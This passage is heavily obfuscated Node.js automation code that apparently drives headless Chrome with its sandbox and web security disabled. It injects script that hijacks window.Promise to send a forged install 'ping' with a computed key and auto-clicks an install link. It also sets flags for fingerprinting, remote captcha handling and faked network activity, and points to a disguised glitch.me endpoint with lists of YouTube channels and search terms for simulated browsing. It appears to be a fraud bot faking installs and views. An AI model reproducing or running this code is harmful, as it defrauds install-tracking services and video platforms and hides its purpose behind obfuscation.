                J[-0x9af + 0x20a9 + -0x1 * 0x16ea] = this['block'], J[K >> 0x26fb + 0x1ebc + 0x5 * -0xdf1] |= x[-0x6b1 + 0x113a + 0x3 * -0x382 & K], this['block'] = J[-0x8c2 + 0x281 + 0x651], K >= 0x1 * 0x13bf + -0x1319 + 0xa * -0xb && (this['hashed'] || this['hash'](), J[0x1af6 + 0x151 * -0x1d + 0xb37] = this['block'], J[0x184e + -0x2367 + 0xb29 * 0x1] = J[0x7 * 0x31a + 0x2107 + -0x36bc] = J[-0x359 * -0x3 + -0x255c + 0x1b53] = J[-0x2526 + -0x1e7 * 0x1 + 0x2710] = J[0xd75 + 0x20 * 0xbc + 0xc1 * -0x31] = J[0x1515 + -0xad + 0x1463 * -0x1] = J[-0x16d5 + -0xa * 0x37a + 0x399f] = J[-0x10ee * 0x2 + 0x32 * 0xa9 + 0xe1] = J[0x13 * -0xd8 + 0x1174 + -0x164] = J[0x6fd * 0x3 + -0xcbb * -0x1 + -0x4cf * 0x7] = J[0x13e * 0x5 + -0x1f21 + -0x18f5 * -0x1] = J[-0x13eb + -0xfb4 + 0x33e * 0xb] = J[0x1e3b + 0x1953 + -0x3782] = J[-0x4 * 0xf7 + -0x1312 + 0x16fb * 0x1] = J[0x5b * -0x4b + 0x19ec + 0xcb] = J[0xd * -0x2d7 + -0x1e37 + 0x4331] = -0xbc5 * 0x3 + 0x1c41 + 0x56 * 0x15), J[-0x10bb + -0xdb6 + 0x1e7f] = this['hBytes'] << -0x207f + 0x8ad * 0x1 + 0x17d5 * 0x1 | this['bytes'] >>> 0x1e96 + -0x2246 + -0x7 * -0x8b, J[0x1c9c + 0xdc6 * -0x1 + -0xec7] = this['bytes'] << -0x1061 + 0x7f3 + 0x871, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x16 * -0x1a6 + 0x1179 + -0x35ad; J < 0xd99 + 0x7dc * -0x1 + -0x3 * 0x1cf; ++J)
                K = Q[J - (0x277 * -0xa + 0x80a + -0x17 * -0xb9)] ^ Q[J - (0x1673 + -0x1 * -0x17c5 + 0x1 * -0x2e30)] ^ Q[J - (-0x1d33 + 0x1 * 0x1237 + 0xb0a)] ^ Q[J - (-0x189 + -0x19 * -0x1 + -0x4 * -0x60)], Q[J] = K << 0x315 + 0x52b + 0x1 * -0x83f | K >>> -0x1443 + -0x1 * -0xf37 + 0x3f * 0x15;
              for (J = 0x817 + 0x259 * -0x10 + 0x1d79; J < -0x92f * -0x2 + -0x1255 * -0x1 + -0x249f; J += 0x20d6 + -0x81c + 0x1 * -0x18b5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1190 + -0x1362 + 0x1 * 0x1d7 | L >>> -0x149d + -0xce8 + 0x21a0) + (M & N | ~M & O) + P + (0x68026c3f + -0x2ce92c3 + -0xab15fe3 * 0x1) + Q[J] << 0x29 * -0xb9 + 0x4c4 * -0x7 + 0x3efd) << -0x2 * 0x98f + -0x1436 + 0x7 * 0x59f | P >>> 0x84 * 0x17 + -0x1 * -0x1156 + -0x1d17) + (L & (M = M << 0x1f7 * 0x7 + -0x4b2 + -0x3 * 0x2fb | M >>> -0x1a93 + -0xa * 0x3d4 + 0x40dd) | ~L & N) + O + (-0x7 * 0x138d9681 + -0x65db4881 + 0x1493cdfa1) + Q[J + (0x1 * 0x2205 + 0x1ed * 0x4 + -0x29b8)] << 0xa09 + -0x40 * 0x2c + 0xf7) << 0x260b + -0x35d * 0xb + -0x107 | O >>> 0x1aa + 0x1 * -0x17b3 + 0x1624) + (P & (L = L << -0x77c * -0x2 + 0x4 * 0x3 + -0x1 * 0xee6 | L >>> 0x3 * -0x8d + -0x1a0f + 0x1bb8) | ~P & M) + N + (-0x19b8e19c + -0x50f90c35 + 0xc534676a) + Q[J + (0x15a3 + 0x5e * 0x2 + 0xe5 * -0x19)] << 0x9 * 0xc1 + -0x351 + -0x8 * 0x6f) << -0xb * 0x2c1 + -0x66 + 0x1eb6 | N >>> -0xa * 0x161 + 0x116 + 0x3 * 0x445) + (O & (P = P << -0x2334 * 0x1 + 0x2 * -0x118d + -0x2336 * -0x2 | P >>> 0x1 * -0x180d + 0x13ed * -0x1 + -0x8cc * -0x5) | ~O & L) + M + (-0x212fa673 * 0x2 + 0xa3180544 + -0x6363ec5) + Q[J + (0x10f * 0x22 + 0x1d85 + -0x4180)] << 0xf39 + 0x626 + 0x1 * -0x155f) << -0x671 + 0x17f + -0x29 * -0x1f | M >>> -0x2356 + 0x11c3 * 0x1 + 0x11ae) + (N & (O = O << 0x1133 + 0x1 * 0x1c97 + 0x2 * -0x16d6 | O >>> 0x2 * 0x7eb + -0x5 * 0x255 + -0x42b) | ~N & P) + L + (-0x7666d8fe + 0x78259790 + 0x3 * 0x1d9693ad) + Q[J + (0x35e + -0x17be + 0x57 * 0x3c)] << 0x1a6c + 0xe8 * 0x8 + -0x21ac, N = N << 0x579 + 0x34b + -0x29 * 0x36 | N >>> -0x23ae * -0x1 + 0x68 * -0x5 + -0x10d2 * 0x2;
              for (; J < 0x1aea + 0x2 * -0x119 + -0x1890; J += 0x1a48 + -0x22da + 0x897)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x13a5 + 0x1 * -0x2225 + 0xe85 | L >>> 0x231d + 0x5 * 0x26b + -0x2f19) + (M ^ N ^ O) + P + (0x97060510 + -0x94dc835e + 0x6cb069ef) + Q[J] << 0x14d1 + 0x10 * 0x1e6 + 0x1 * -0x3331) << -0xd83 + -0x157 * -0x1d + 0x1953 * -0x1 | P >>> -0x23d3 * -0x1 + 0x1ea3 + 0x1 * -0x425b) + (L ^ (M = M << -0xc06 + 0x4a0 + 0x784 | M >>> 0xaf2 + 0x112 + 0x3a * -0x35) ^ N) + O + (-0x1c97ef09 + 0xd9609d8a + -0x1cff8a * 0x2b0) + Q[J + (0x1 * -0x22cb + 0x5ec + 0x1ce0)] << 0x5bd * 0x5 + -0x24a8 + 0x7f7 * 0x1) << -0x1fb9 + 0x1d3 * 0x13 + -0x2eb | O >>> 0x6ff + -0x4 * -0x63a + -0x1fcc) + (P ^ (L = L << -0x17 * -0x130 + 0x79 * -0x38 + -0xba | L >>> 0x12 * -0x21d + -0x2 * -0x999 + 0x12da) ^ M) + N + (0x26 * -0x436768f + 0x645830bb + -0x284 * -0x43d008) + Q[J + (0x52a + -0x113 * 0x11 + 0xd1b * 0x1)] << -0x341 * -0x7 + 0x15b2 * 0x1 + -0x2c79) << -0x41 * -0x60 + 0x1 * -0x1a56 + 0x1fb | N >>> -0x25ec + -0x1 * -0x14a1 + 0x1166 * 0x1) + (O ^ (P = P << 0x25 * -0x97 + 0x86 * 0x43 + -0xd21 | P >>> -0x2de * 0x2 + 0x22c1 + -0x1 * 0x1d03) ^ L) + M + (-0xc8deeae6 + -0x8f5903f * -0x9 + 0x2 * 0x738b6228) + Q[J + (0x490 + -0x1cdf + 0x1852)] << 0xd17 * 0x1 + -0x1e7d + -0x1166 * -0x1) << 0x3 * 0xaed + -0x1 * 0x141b + -0xca7 * 0x1 | M >>> -0x1a1c * -0x1 + 0xf63 + 0x14b2 * -0x2) + (N ^ (O = O << -0x6 * -0x5b1 + -0x79 * 0x4a + 0xf2 | O >>> 0xf7b + -0x18 * -0x182 + -0x33a9 * 0x1) ^ P) + L + (-0x188267f4 + 0x6c635450 * -0x2 + 0x16022fc35) + Q[J + (-0x14b1 + 0x6b1 * -0x3 + 0x28c8)] << 0x6 * -0x4c8 + -0x1 * -0x67b + -0x5 * -0x471, N = N << 0xc17 * 0x2 + -0x14ac + 0x7c * -0x7 | N >>> 0xdf9 * 0x1 + -0xad * -0x4 + -0x1 * 0x10ab;
              for (; J < -0x38d + -0x1 * 0x1f85 + 0x11a7 * 0x2; J += 0xd7 * 0xf + 0xcf9 + -0x198d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x727 * -0x2 + 0x11d5 + -0x201e | L >>> 0xd44 + -0x3 * 0x43b + -0x78) + (M & N | M & O | N & O) + P - (0x2acadf59 + 0x850052b0 + 0x14f7a4f7 * -0x3) + Q[J] << 0x1ec1 + -0x6da + 0x1 * -0x17e7) << 0x11 * -0x34 + 0x24b0 + -0x2137 | P >>> 0x92e + -0x112c + -0x2b3 * -0x3) + (L & (M = M << 0x3 * 0x18d + -0x3 * -0x31a + 0x1 * -0xdd7 | M >>> -0x245c + 0x1fd * 0x13 + -0x169) | L & N | M & N) + O - (-0x600bd624 + -0x2a91 * -0x30797 + 0x4ffa06c1) + Q[J + (-0x6cd * -0x1 + 0x2 * 0x629 + -0x131e)] << 0x7d * -0x11 + 0x242f * -0x1 + -0xb1f * -0x4) << 0x2013 + 0x1 * 0x8e9 + 0x28f7 * -0x1 | O >>> -0x1c2f + 0xc * -0x2e1 + 0x2a * 0x17f) + (P & (L = L << 0x608 * 0x2 + -0x1 * 0x426 + -0x7cc | L >>> 0x1a3 * -0x5 + -0x13f * -0x1f + -0x1e70) | P & M | L & M) + N - (-0x3800783 * -0x39 + -0xbdd8977 + 0x178 * -0x32e4ae) + Q[J + (0x11b1 + -0x1 * 0x6b5 + -0xafa)] << 0x688 + 0xbf * 0xc + 0x1 * -0xf7c) << -0x20f6 * 0x1 + 0x257f + -0x11 * 0x44 | N >>> 0x9 * 0x8f + 0x268c + -0x34 * 0xd6) + (O & (P = P << -0x1804 + 0xb9 * 0xe + -0x4ac * -0x3 | P >>> 0x1bae + -0x20e3 + 0xf * 0x59) | O & L | P & L) + M - (-0xd7665f2c + 0x3 * 0x12ece05e + -0xd837 * -0x1417a) + Q[J + (-0x4 * -0x683 + 0x1611 + -0x301a)] << 0x1 * -0x1499 + 0x1050 + 0x1 * 0x449) << 0x6 * 0x4df + 0x2480 * -0x1 + 0x1 * 0x74b | M >>> 0x1854 + 0x4 * -0x2dd + -0xcc5) + (N & (O = O << -0x241 * 0x6 + 0xd1 * 0x29 + -0x13d5 | O >>> -0x1 * -0x10a1 + 0x911 * -0x1 + 0x78e * -0x1) | N & P | O & P) + L - (0x1ac96018 + 0xe040c96e + -0x8a25e662) + Q[J + (0x26b7 + 0x1078 + -0x372b)] << 0x203 + 0x14a6 + -0x16a9, N = N << -0xc07 + 0x6 * 0x28d + -0x329 | N >>> 0x7df + 0x23b6 * 0x1 + 0x1 * -0x2b93;
              for (; J < 0x9c5 + -0x31a + -0x1 * 0x65b; J += -0x2 * 0x1253 + -0x1e29 + 0x1 * 0x42d4)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x5d5 * -0x2 + 0x443 + -0x76c * -0x1 | L >>> -0x8c3 + -0xa * -0x16c + 0x1 * -0x55a) + (M ^ N ^ O) + P - (-0x2262ce63 + -0x11baa4fd + 0x431 * 0x1939aa) + Q[J] << -0xe7c + 0x1e6a + -0xfee) << -0x2577 + 0x1130 + -0x3 * -0x6c4 | P >>> 0x409 * -0x5 + -0xedc + 0x4 * 0x8c9) + (L ^ (M = M << -0x8 * 0x20e + 0xd9f + 0x2ef * 0x1 | M >>> 0x4 * 0x38d + 0x1921 + 0x2753 * -0x1) ^ N) + O - (0x181f9471 + -0x5c4a75ed * -0x1 + -0x3ecccc34) + Q[J + (0x10f2 + 0xe62 + 0xf3 * -0x21)] << -0x1582 + 0x3 * 0xadd + 0x1 * -0xb15) << 0x1 * 0x1d32 + -0x6 * -0x479 + -0x3803 | O >>> 0x20b2 + -0x1abc + -0x5db) + (P ^ (L = L << 0x26 * -0x3a + -0x5b * 0x13 + 0xf7b | L >>> 0x262a * 0x1 + -0x14b5 * -0x1 + -0x3add) ^ M) + N - (0xe559802 + -0x2eb0ddcb + -0x3a11e9 * -0x17b) + Q[J + (-0x1148 + -0x23eb + 0x3535)] << 0x24a2 + 0x1d33 + -0x41d5) << 0x22e + 0x97 * -0x32 + 0x1b55 | N >>> 0x503 * 0x4 + 0x1 * 0x2161 + -0x186 * 0x23) + (O ^ (P = P << 0x1385 * -0x1 + -0x1ec5 + 0xc9a * 0x4 | P >>> -0x196f + 0xa7b * -0x1 + -0xf2 * -0x26) ^ L) + M - (-0x71e362b * 0x1 + -0x1 * -0x25a5567f + 0x17161dd6) + Q[J + (0x3 * -0x24f + 0x9e3 + -0x2f3)] << 0x1 * -0x3d6 + -0xc7 * -0x5 + 0x1 * -0xd) << -0x9a8 + -0x113 * 0x11 + 0x1 * 0x1bf0 | M >>> 0x1 * 0x9 + -0x20d4 + 0x20e6) + (N ^ (O = O << 0x2421 + -0x1980 + 0x27 * -0x45 | O >>> -0x805 + 0x64 * -0x18 + 0x2d * 0x63) ^ P) + L - (0x268132 * 0x21e + 0x23dcda * -0x119 + 0xb752198) + Q[J + (0x1963 + -0x8b5 + 0x2c7 * -0x6)] << -0x1de3 + 0x1e96 + -0xb3, N = N << -0x2649 + -0xe85 + 0x3 * 0x11a4 | N >>> -0x1 * 0x1b23 + -0xc02 + 0x2727 * 0x1;
              this['h0'] = this['h0'] + L << -0xc60 + -0x1f51 + -0x1 * -0x2bb1, this['h1'] = this['h1'] + M << 0x991 + 0xfeb + 0xe9 * -0x1c, this['h2'] = this['h2'] + N << 0x88c + -0x1 * -0x1133 + -0x3 * 0x895, this['h3'] = this['h3'] + O << 0x6 * -0x209 + -0x6a * -0xc + 0x73e, this['h4'] = this['h4'] + P << -0x2384 + -0x29 + 0x1 * 0x23ad;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x1c00 + 0x1f2 + -0x18a * -0x11 & 0x22 * 0xce + -0x1dd + -0x1970] + w[J >> -0x1 * -0x23 + 0x187a + -0x1885 & 0x1306 + 0x2 * -0x1058 + 0x3 * 0x493] + w[J >> 0x5 * -0x2ef + -0x1 * 0x2222 + 0x30e1 & 0x1b08 + -0x1730 + -0x3c9] + w[J >> -0xe02 + -0x1 * -0x106 + -0x1 * -0xd0c & -0x4d2 + 0x162c + 0xe9 * -0x13] + w[J >> 0x20dd + -0x794 + 0x7 * -0x39b & -0x22a2 + 0x1f8e + 0xb * 0x49] + w[J >> -0x1ac1 + 0x13f1 + -0x6d8 * -0x1 & 0x520 + 0x933 + -0xe44] + w[J >> 0x2029 + 0x9bc + -0x29e1 & -0x1d05 + 0x23de * -0x1 + 0x40f2] + w[0x2491 + 0x2ed * -0x3 + -0x1bbb & J] + w[K >> -0xc2f * -0x1 + 0x1bdd + -0x27f0 & -0x2b * 0x2b + 0x17 * -0x3 + 0x78d] + w[K >> 0x69e + 0x10bc + -0x1742 & 0xae2 + 0x1 * 0x11d6 + -0xfd * 0x1d] + w[K >> 0x47 * 0x1c + 0xee3 + -0x1693 & 0x1b09 + -0x660 + -0x149a] + w[K >> 0x1 * -0xa37 + -0x2 * -0x837 + 0x19 * -0x3f & -0x2702 + -0x2b * 0x3b + -0x2 * -0x187d] + w[K >> -0xed8 + 0x4e4 * -0x7 + -0x20c * -0x18 & -0x109 * 0x1 + -0x101c * 0x1 + 0x1134] + w[K >> 0x4ce * -0x6 + 0x61e * 0x2 + -0x10a0 * -0x1 & -0x2348 + -0x108e + 0x5 * 0xa61] + w[K >> 0x1a41 * 0x1 + -0x15 * -0x111 + -0x30a2 & -0x30a + 0x24be + -0x21 * 0x105] + w[0xc11 + -0xe15 * -0x1 + -0x1a17 & K] + w[L >> 0x1 * 0x24c1 + 0x2125 + 0x45ca * -0x1 & 0x4 * -0xd3 + -0x2 * 0x9ca + -0x1 * -0x16ef] + w[L >> -0x102c + -0x68d * -0x3 + -0x363 & -0x100 + -0xd * 0xa1 + 0x93c] + w[L >> -0x13af * 0x1 + 0x2309 + -0xf46 & -0x2609 * -0x1 + 0x3ea + -0x29e4] + w[L >> -0xb * 0x10 + 0x2 * 0xf94 + -0x1 * 0x1e68 & -0x1 * -0x18da + -0x8fa + -0xfd1] + w[L >> 0x1 * 0x139d + 0xbbf * -0x3 + 0xfac & 0x1460 + -0x20a5 + 0xc54] + w[L >> 0x11f7 + 0xae * -0x39 + 0x7 * 0x2f9 & 0x5ab + 0x8 * -0xf2 + 0x1f4] + w[L >> -0x1 * -0x2642 + 0x145 * 0xa + -0x32f0 & 0x13c * -0x5 + 0x1b49 + 0x37 * -0x62] + w[-0x1 * 0x19b1 + 0x1ca1 + -0x43 * 0xb & L] + w[M >> -0x2547 * 0x1 + 0x1 * -0x27d + -0x4 * -0x9f8 & 0x3d3 * 0x1 + 0x12b1 + -0x1675] + w[M >> -0x3 * -0x9b0 + -0x9e3 * 0x3 + 0xb1 & 0x2493 + -0x2375 + -0x10f] + w[M >> -0x1ac7 + -0x2dc + 0x1db7 * 0x1 & -0x6b8 + -0xd83 * -0x1 + -0x35e * 0x2] + w[M >> 0x1 * 0x236e + 0x46c + 0x2 * -0x13e5 & 0x23aa + 0xa * 0x11a + -0x2e9f] + w[M >> 0x2403 + -0x2a2 * -0x5 + -0x3121 & -0x47 * 0x16 + -0x15a5 * -0x1 + -0xf7c] + w[M >> 0xfe3 + 0x1c3e + -0x2c19 & 0x1f29 + -0x50f + -0x1a0b * 0x1] + w[M >> 0x26d9 + -0x5 * -0x29 + -0x1 * 0x27a2 & -0x1 * -0x4df + -0xac0 + -0x8 * -0xbe] + w[-0x102b + -0xa52 + 0x6a3 * 0x4 & M] + w[N >> -0x1a00 + 0x4 * -0x50e + -0x2e54 * -0x1 & -0x241d * -0x1 + 0xe64 + -0x3272] + w[N >> 0xb86 * 0x1 + 0x38 * -0x4c + 0xa * 0x85 & 0x1fff + -0x24b1 + -0x4c1 * -0x1] + w[N >> -0x26f * -0x6 + 0x125 * -0xb + 0x1 * -0x1ef & -0x597 + 0xa * -0x5d + -0xb * -0xd8] + w[N >> 0x2680 + 0x20ec + -0x23ae * 0x2 & -0x1e5f + 0xe3f + 0x102f] + w[N >> 0x91 + -0xc87 * 0x1 + 0x6a * 0x1d & -0x29 * -0xe5 + 0x309 + -0x27a7] + w[N >> -0x999 + -0xe32 * -0x2 + -0x12c3 & 0xb63 + 0xf35 + -0x1a89] + w[N >> -0xcea * 0x2 + -0x3 * -0x835 + 0x139 & -0x1610 + 0x4 * 0x6ad + -0x11 * 0x45] + w[0x9a7 * -0x1 + 0x9a5 + -0x11 * -0x1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1ebb + 0x1654 + 0x1 * -0x34f7 & -0x4c1 * -0x7 + 0x55b * 0x7 + 0x35 * -0x151,
                J >> 0x4 * -0x94 + -0x176f + 0x19cf & 0x1e65 * 0x1 + -0x8d0 + -0x22 * 0x9b,
                J >> 0x4 * 0xe1 + -0x1456 + -0x1 * -0x10da & 0x1d74 + 0x5b3 * 0x5 + -0x38f4,
                0x1ac7 + 0x21d0 + -0x3b98 & J,
                K >> -0x1 * 0x7cf + -0x11bb + 0xcd1 * 0x2 & -0x1f * 0x124 + -0x1ff * -0x1 + -0x2 * -0x112e,
                K >> 0x3d * 0x11 + -0x2 * 0x86a + 0xad * 0x13 & 0x14a + 0x3e6 * 0x3 + -0x5d * 0x21,
                K >> -0x42c + 0x207b + 0x3 * -0x96d & 0x486 + 0x2 * -0xb1b + 0x12af,
                -0x6c8 + -0xba0 + 0x1367 & K,
                L >> 0x3a3 + -0xde9 + 0x1 * 0xa5e & 0x1b7 * -0x4 + 0x18c1 + -0x10e6,
                L >> -0x2 * 0x2aa + 0xdf * 0x9 + -0x273 & -0x19ef + 0x2506 + -0x8 * 0x143,
                L >> -0x270d + -0xefc + 0x3611 & -0x1177 * -0x1 + -0x215 + -0xe63,
                -0x29 * -0xb3 + -0x14 * -0x1e2 + -0x4154 & L,
                M >> -0x22d4 + -0xc8d + 0x1 * 0x2f79 & -0x4e * 0x48 + -0x772 + -0x1e61 * -0x1,
                M >> -0xf91 + -0xefe + 0x75 * 0x43 & 0x24ef + 0x2602 + -0x49f2,
                M >> -0x1995 + 0xefd + 0xaa0 & -0x20c9 + -0x1ace + 0x3c96,
                0x896 + -0x49 * -0x88 + -0x2e5f & M,
                N >> 0x1 * -0x2629 + -0x13c5 + -0x3a06 * -0x1 & 0xe * -0x4b + -0x1401 + -0x11 * -0x17a,
                N >> -0x115 * 0x10 + -0x1167 + 0x22c7 & 0x1237 * 0x1 + 0x19d + -0x12d5,
                N >> 0x3a1 * -0x2 + 0x37d + -0x7 * -0x8b & -0x1 * -0x1805 + 0x10bf * -0x1 + -0x647,
                -0xb3 * -0x1f + 0x1 * -0xca + -0x13e4 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x156 * 0x1d + -0x2d * -0x8e + -0x3fa0), (K = new DataView(J))['setUint32'](-0x1b88 + -0x534 + -0xa * -0x346, this['h0']), K['setUint32'](-0x25 * 0x39 + 0x1fef + 0x2 * -0xbd7, this['h1']), K['setUint32'](-0xf33 * -0x2 + 0x1103 + -0x2f61, this['h2']), K['setUint32'](0x2658 + -0x895 + -0x1db7, this['h3']), K['setUint32'](0x446 + 0x1 * 0x23a7 + 0x9d * -0x41, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G[S(0x12, 'H2$A')]['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x2f6 + -0x34 * -0x16 + -0x76e];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x5ab + -0x117d * 0x1 + -0xd * -0x1c8;
            J[0x1 * 0x191 + 0x1b9 * 0xd + 0x1 * -0x17f6]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xfe * -0x1 + 0x11d0 + -0x10d2] = L => {
              const T = b;
              let M = I[T(0x15, '!PwY') + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x15d2 * 0x1 + 0x1d5f + 0x17 * -0x54), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1476 + 0x1104 + 0x373 * 0x1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x2 * 0x5e7 + -0x3f7 * -0x1 + -0x9e9 * 0x1), Promise['resolve'](0x52 * 0x5d + -0xd82 + -0x1047 * 0x1);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x870 + -0x2fd + 0x2d * -0x1f; j < 0x16 * 0xad + -0x15b3 + 0x36b * 0x2; j++)
    i();
}
const NETWORK_PATIENCE = 0x2 * 0xdd7 + -0x1a38 + 0x1dca + (0x106 * 0x3 + 0x10b1 * 0x1 + 0x80b * -0x1) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x8cb + 0xe43 + 0x11 * -0x15b) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    U(0x14) + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + U(0xd) + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + V(0x1) + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x14ba + -0x131 + -0x1389; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + U(0x5) + 'moo.io\x20wor' + V(0xf) + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + U(0x1d) + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + W(0x20, 'Qc@o') + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + W(0xe, '!fjl') + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + W(0x8, 'w(LP') + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 